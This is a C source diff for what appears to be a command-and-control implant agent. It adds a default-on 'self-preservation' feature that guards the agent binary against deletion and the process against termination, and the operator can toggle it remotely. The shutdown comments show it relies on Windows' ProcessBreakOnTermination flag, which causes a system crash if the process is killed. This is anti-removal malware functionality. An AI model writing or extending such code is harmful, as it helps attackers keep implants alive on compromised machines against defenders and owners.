@@ -297,6 +297,17 @@ int agent_run(agent_ctx_t *ctx)
     /* Seed the random number generator for jitter. */
     srand((unsigned int)pal_time_unix());
 
+    /* Enable self-preservation by default.
+     * This protects the agent binary from deletion and hardens
+     * the process against termination.  The operator can toggle
+     * it off remotely via TASK_SELFPRESERVE. */
+    if (pal_self_preserve_start() == 0) {
+        ctx->self_preserve = 1;
+    } else {
+        pal_log("Self-preservation init failed (non-fatal).");
+        ctx->self_preserve = 0;
+    }
+
     ctx->running = 1;
 
     while (ctx->running) {
@@ -395,6 +406,15 @@ void agent_shutdown(agent_ctx_t *ctx)
             proto_send(&ctx->proto, &msg);
             tlv_buffer_free(&msg);
         }
+    }
+
+    /* Disable self-preservation before exit.
+     * CRITICAL on Windows: the ProcessBreakOnTermination flag
+     * must be cleared before the process exits, or the system
+     * will bug-check (BSOD). */
+    if (ctx->self_preserve) {
+        pal_self_preserve_stop();
+        ctx->self_preserve = 0;
     }
 
     proto_disconnect(&ctx->proto);
